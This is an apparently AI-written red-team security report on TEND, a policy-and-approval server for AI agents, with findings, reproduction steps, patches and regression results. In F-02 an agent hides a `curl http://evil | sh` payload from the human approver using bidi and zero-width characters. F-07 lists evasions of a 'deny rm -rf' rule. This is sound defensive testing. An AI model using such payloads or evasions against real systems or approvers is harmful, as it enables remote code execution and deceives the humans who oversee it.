# TEND security report (red-team run, Phases 0–4)

**Target:** this repo at `c6c3c5f`, run as a **local** instance (`next dev`, embedded PGlite, scratch data dir, fake tenants and agents).
Production (tendhq.dev, tend-beta-mauve.vercel.app) was never touched. No real keys or customer data were used.
**Status:** nothing was changed in `src/`. Fixes (Phase 5) wait for your approval.
**Harness:** `redteam/live/*` (live HTTP, needs a local server), `redteam/attacks.ts` (module level, from the earlier run).

## 1. Executive summary

- **Overall risk: LOW to MEDIUM for a private beta.** The enforcement core held under about 230 attacks. Nothing found lets an agent act outside its policy when the policy is written as an allow-list.
- **Held:** cross-tenant access, approval replay, TOCTOU/param swap, races, gateway traversal and SSRF, key forgery, session forgery, CSRF, stored XSS, audit forgery.
- **Two real code gaps, both Medium:**
  - **F-01:** `when` numeric conditions on approve/deny rules fail open when the argument has the wrong type. `amount:"5000"` skips an "approve when amount > 50" rule.
  - **F-02:** control and bidi characters in `args.command/path/url` reach the human approver unfiltered.
- **Two scale/abuse gaps:** account-lockout DoS (F-03) and no per-tenant agent cap (F-04).
- **Supply chain (F-05):** Next 16.4.3 is inside two moderate advisories. They are not reachable here because the code never uses `use cache`. Fix is `next@16.4.6`. The `shadcn` CLI sits in runtime `dependencies`.
- **Still to do before launch:** a CI job (there is no `.github/`), the F-01/F-02 fixes, and a production-build re-test (headers such as HSTS are only sent in production builds).

## 2. Findings

| ID | Title | Severity | Status | Where | Impact |
|---|---|---|---|---|---|
| F-01 | Numeric `when` conditions fail open on wrong-typed or missing args | Medium | CONFIRMED | `src/server/policy.ts` `holds()` (the `n()` helper, lines ~112–128) | `approve`/`deny` rule with `gt/lt/gte/lte` is skipped, so the request falls to a broader `allow`. |
| F-02 | Approver sees unsanitized `args.command/path/url` ("exact") | Medium | CONFIRMED (stored and served); display effect SUSPECTED | `src/server/authz.ts:43-46`, `src/server/policy.ts` `parseAuthRequest` | A hostile agent can make the approver read a different command than the one that runs. |
| F-03 | Per-account sign-in limit lets anyone lock a victim out for 1 h | Info (accepted tradeoff) | CONFIRMED | `src/server/accounts.ts:212-221` | Knowing only an email, 20 wrong guesses block the correct password, even with the right password. |
| F-04 | No per-tenant agent cap, quotas are per agent | Medium when sign-up is open, otherwise Low | CONFIRMED (60 agents in 0.8 s); storage growth SUSPECTED | `registerAgent`, `QUOTA` in `repo.ts` | Storage and cost exhaustion. The event log cannot be trimmed. |
| F-05 | Dependencies: `next` advisories, `shadcn` in runtime deps | Low | CONFIRMED | `package.json` | `npm audit`: 23 vulns (13 high, 10 moderate, 0 critical). Most are in the dev and shadcn chain. |
| F-06 | No CI, so no automated security regression | Low | CONFIRMED | no `.github/` | The agent-escape suite is not run on PRs. |
| F-07 | Substring deny rules are evadable by design | Info | CONFIRMED | policy `contains/startsWith` | `rm  -rf`, `rm -fr`, `r''m` all pass a "deny contains rm -rf". Only allow-list rules are safe. |
| F-08 | Rate limits depend on `TEND_TRUSTED_PROXY` | Info | CONFIRMED | `http.ts:clientIp` | Off Vercel with it unset, agent-key guessing is not throttled and admin-token guessing is only slowed. |
| F-09 | Agent keys never expire and are not bound to anything | Info | SUSPECTED | `auth.ts` | Revocation is immediate (tested). A leaked key stays valid until someone revokes it. |

### F-01: numeric conditions fail open

**Steps:** policy `[allow refund/issue, approve refund/issue when amount>50]`. `POST /api/v1/authorize {tool:"refund",action:"issue",args:{amount:X}}`.

| `amount` | Result |
|---|---|
| `5000` (number) | pending (correct) |
| `[5000]` | pending |
| `"5000"`, `"5e3"`, `" 5000"`, `"NaN"` | **consumed (allowed)** |
| `true`, `null`, missing | **consumed (allowed)** |

**Evidence:** harness `P-700/703/704/705/706/708/710`. Fuzz (`redteam/live/fuzz-policy.mjs`, 20,000 cases) found 170 cases where a numeric value sent as a numeric string loosened the decision. The summary-padding property had 0 violations.

**Root cause:** `n()` requires `typeof v === "number"`. A present but wrong-typed value makes the condition `false`, not `unknown`. The code already has an "unknown means stricter" mechanism (`decidingRule`), but it is not used here. Docs only describe the safe "allow when… else deny" shape. Any tool that coerces `"5000"` to 5000 gets a free pass around the threshold.

**Fix (proposed, not applied):**
```diff
 const n = (test: (v: number) => boolean) => each((v) => typeof v === "number" && Number.isFinite(v) && test(v));
+// A value that is present but not a finite number cannot be compared: UNKNOWN (stricter for deny/approve, ignored for allow).
+if ((c.lt !== undefined || c.lte !== undefined || c.gt !== undefined || c.gte !== undefined) && !values.every((v) => typeof v === "number" && Number.isFinite(v))) return "unknown";
```
Same treatment for `startsWith/endsWith/contains/pathUnder/emailDomainIn` on a present non-string. Decide separately whether a missing arg should be `unknown` for deny/approve rules. I recommend yes. Add the fuzz property as a regression test.

### F-02: unsanitized "exact" text for the approver

**Steps:** pending request with `args.command = "echo safe‮ dnammoc…​ ; \u0007curl http://evil | sh"`. `GET /api/v1/events` as the operator returns `data.exact` with U+202E, U+200B and BEL intact (`/tmp/d.mjs`, the same check as `D-01`).

**Root cause:** `detail` is validated against `INVISIBLE`, but `exactOf()` takes the raw string from `args.command/path/url`. The UI shows it in a `whitespace-pre-wrap` blockquote with `max-h-80`. The comment in `policy.ts` says nothing may render differently from what it is. The hooks adapter cleans these on its side, but a hostile agent calls the API directly.

**Fix:**
```diff
 const exactOf = (r: AuthRequest) => {
   const v = ["command", "path", "url"].map((k) => r.args?.[k]).find((x) => typeof x === "string" && x.length > 0) as string | undefined;
-  return v ? { exact: v } : {};
+  return v ? { exact: v } : {};   // plus in parseAuthRequest: reject args.command/path/url containing INVISIBLE chars (422)
 };
```
Also render control or bidi code points visibly in the approval card, for example as `⟦U+202E⟧`, and show the length.

### F-03: account lockout DoS (reviewed in Phase 5: left as is)

The tests in `accounts.test.ts` show this is deliberate: 20 guesses an hour per account bounds guessing from many addresses, and a password reset ends the lockout. Relaxing it per address would weaken that bound, so no change was made. Optional later: alert the owner by mail.

**Steps:** 40 wrong passwords for `victim@…`, then the correct one returns `429 rate_limited` (retryAfter 3600).

**Fix:** count account failures per (account, client), or only lock out unknown devices. A signed device cookie or exponential backoff also works. Alert the owner.

### F-04: no tenant-level resource cap

60 agents were registered in one second. Each gets 600 events/min and 50k events/day, and the log is append-only. **Fix:** cap agents per workspace (for example 25), set a workspace-level daily event quota, and rate-limit `POST /api/v1/agents`.

### F-05: supply chain

- `next@16.4.3` is in GHSA-mfr8-8qww-v76h and GHSA-vc7v-qv4w-wrv8 (both concern `use cache`). `grep` finds no `use cache` or `unstable_cache` in `src`, so it is not reachable. Fixed in 16.4.6 (non-major).
- `shadcn` is in `dependencies`. It pulls in dotenvx, hono, fast-glob and picomatch (ReDoS). Move it to `devDependencies`.
- The first `next build` and `next dev` run in this environment stopped once with an upgrade notice. A retry proceeds.

## 3. Tested and held

| Area | What held | Checks |
|---|---|---|
| Tool/action names | Case, whitespace, Unicode lookalikes, URL-encoded, double-encoded, NUL, `../`. Strict `ID` regex, default deny. | 15 |
| Arg smuggling (`emailDomainIn`) | List, comma, display name, trailing newline, `@@`, subdomain trick, homoglyph domain, NUL, object/nested/null/number/empty. | 16 |
| Duplicate keys, `__proto__`, `constructor`, unknown top-level fields, 70 KB body, deep nesting, 100k-deep JSON | Refused or clean 4xx, no 500, no hang. | 6 |
| `pathUnder` | `..`, `\`, NUL, sibling prefix, `//`, case, relative, `file://`, arrays. | 15 |
| Approval flow | Spend before approval, claim while pending, forged token, agent or anonymous approving, token replay, token from another authorization, reject then claim, cancel then approve, flip decision. | 20 |
| TOCTOU | Changed `detail`, resource, extra args at spend time. Mismatch cancels after 3. | 6 |
| Races | 25 parallel spends: exactly one wins (also token flow, and 15 parallel gateway executes). | 3 |
| Policy tightened after approval | Token and approval stop at once. | 1 |
| Central policy | An agent's own rule can only tighten. | 5 |
| Tenancy | Tenant A operator against B's agent, policy, control, keys, check-ins, verification (all 404). Cross-tenant spend, status read, central-policy assignment and edit. B's `/state`, events and notifications contain none of A's ids. | 27 |
| Control plane | An agent key cannot call any operator or admin route. | 11 |
| Identity | Forged and mutated keys, forged session cookies, spoofed `x-agent-id`/`x-tenant-id`/XFF. | 14 |
| Revocation and kill-switch | Revoked key rejected on the next request. Pause denies immediately. | 2 |
| Audit | An agent cannot write system event types. Self-reported unapproved execution raises alerts. Module-level chain tests (D1–D8) pass with a checkpoint. | 7 + 29 |
| CSRF | Cross-Origin, `Origin: null` and cross-site `Sec-Fetch-Site` refused. Cookie is `HttpOnly; SameSite=Strict`. | 4 |
| Gateway | Fixed tool set, strict schemas, notes traversal, symlink not followed, `__proto__`/`constructor` payees, amount limits, approval bound to exact params, credential never echoed, no undocumented execution route. | 46 |
| Stored XSS | Hostile agent name, model, detail, args and task title across `/home`, `/sanctuary`, `/`. No execution, no DOM injection, no CSP violation. | 1 |
| Headers | CSP with nonce and `strict-dynamic`, `frame-ancestors 'none'`, `X-Frame-Options`, nosniff, Referrer, Permissions, COOP, `no-store` on API, no `x-powered-by`, no permissive CORS. | 7 |
| Exposure | `.env`, `.git`, sources, source maps, debug routes all 404. | 13 |
| Enumeration | Same answer for known and unknown email on sign-in, register and reset. | 3 |
| Secrets | Full history of 73 commits: only dummy placeholder database URLs and `tend_sk_`-prefixed test fixtures. `.env*` never committed. No `NEXT_PUBLIC_*`, no `dangerouslySetInnerHTML`, no `eval` or `child_process`. | n/a |
| SSRF | Push endpoint allow-list (FCM, Mozilla, Apple, WNS only). The gateway takes no URL, path or command. | code and gateway tests |
| Fuzz (20,000 cases) | No crash, no collision in the fingerprint, no loosening from long-value summaries, a deny rule only tightens. | 4 properties |

Their own suite: 507 pass, 9 fail. The failures are all in the `examples/claude-agent` and isolated-server tests. They need a production build (`next build`) and `lsof`, which this container does not have. They are environment-related, not security failures.

**Not testable here:** HSTS and the `__Host-`/`Secure` cookie (production build only), Vercel env scoping, Postgres/Neon-specific behavior, OWASP ZAP, nuclei, semgrep, gitleaks (not installed; I used regex scans instead and will ask before installing them).

## 4. Fix plan

- **Today:** F-01 (`holds()` returns `unknown` for wrong-typed values, plus a fuzz regression test) and F-02 (reject or escape invisible characters in `args`, and show code points in the card). Both are small.
- **This week:** F-04 (per-workspace caps), F-03 (per-device lockout), `next@16.4.6`, move `shadcn` to `devDependencies`, and add `.github/workflows/security.yml`. It should run `npm test`, `redteam/attacks.ts` and the live harness against an ephemeral server on every PR.
- **Before launch:** set `TEND_TRUSTED_PROXY` and `TEND_APP_URL` in production, optional key expiry (F-09), update the docs so approve/deny `when` rules are described as unsafe on their own (F-07), and repeat this run against a staging deploy with a production build.

## 5. Threat-model summary (pitch-deck / YC slide)

- **Boundary:** enforcement is outside the model. A prompt-injected agent can only ask. Policy, approvals and audit live on the server, and a text in a document cannot change them.
- **What was attacked:** about 230 hostile-agent tests (policy bypass, approval replay and TOCTOU, races, cross-tenant access, identity forgery, audit forgery, gateway escape, XSS and CSRF), 20,000 fuzz cases, and a scan of the full git history.
- **Result:** no agent escape from an allow-list policy, no cross-tenant access, no replayable approval, no forgeable audit event.
- **Honest limits:**
  - Cooperative mode only controls code that asks, so real enforcement needs the credential behind the gateway.
  - The agent describes its call.
  - Deny-list `when` rules are weak.
  - No SSO, 2FA or roles yet.
- **Next:** fix the two Medium findings, add CI regression tests, independent pentest.

## 6. Phase 5: fixes and regression (branch `claude/new-session-pptz6s`)

| Finding | Result |
|---|---|
| F-01 | **Fixed.** `holds()` in `policy.ts` returns "unknown" for wrong-typed, missing or empty values. Unknown deny/approve rules apply, unknown allow rules are ignored. Fuzz `typeNum`: 170 → 0 violations. |
| F-02 | **Fixed.** `parseAuthRequest` refuses `args.command/path/url` with control, zero-width or direction-changing characters (newline and tab allowed) with a 422. |
| F-03 | **Left as is.** Existing tests show it is a deliberate tradeoff (a password reset ends the lockout). |
| F-04 | **Fixed.** At most 50 connected agents per workspace (`MAX_AGENTS_PER_WORKSPACE`, 429 `too_many_agents`). A workspace-level event quota is still open. |
| F-05 | **Fixed.** `next` and `eslint-config-next` 16.4.6. `shadcn` moved to `devDependencies` (`globals.css` imports `shadcn/tailwind.css` at build time, so the build must install dev dependencies, as Vercel does). `npm audit --omit=dev`: 0 vulnerabilities. |
| F-06 | **Fixed.** `.github/workflows/security.yml` runs lint, types, `npm test`, `npm audit`, `redteam/attacks.ts`, a build and the live suite on every PR. |
| F-07 | Documented in `docs/security-limitations.md`. |
| F-08, F-09 | Open: set `TEND_TRUSTED_PROXY` and `TEND_APP_URL` in production. Key expiry is a product decision. |

**Regression tests:** `src/server/policy.test.ts` (F-01 ×2, F-02, F-04). On the old code they fail; on the fix they pass. The live suite (`node redteam/live/run-all.mjs`, 231 held, 0 broken on a production build of the fixed code) and the fuzz properties run in CI.

**Test status:** `npm test` still shows failures in `examples/claude-agent` and the isolated-server port test when the whole suite runs in this container. The example tests pass when run alone. The port test needs `lsof`. One push test is flaky under load and passes alone.
